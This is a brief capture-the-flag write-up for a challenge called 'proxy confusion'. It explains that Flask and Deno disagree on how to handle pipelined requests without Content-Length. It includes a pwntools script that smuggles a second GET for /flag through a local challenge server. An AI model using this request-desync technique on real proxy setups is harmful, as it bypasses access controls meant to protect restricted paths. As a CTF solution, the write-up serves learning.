# proxy confusion

## Description
Which web server would you like?

## Writeup

When 2 requests are sent in the same socket connection without Content-Length, flask ignores the second one while deno treat it as a next request.
```python
from pwn import *

io = remote("localhost", 4000)
io.send(b"""
GET / HTTP/1.1

GET /flag HTTP/1.1
        """.strip().replace(b"\n", b"\r\n") + b"\r\n\r\n")

r = io.recv()
print(r.decode())
```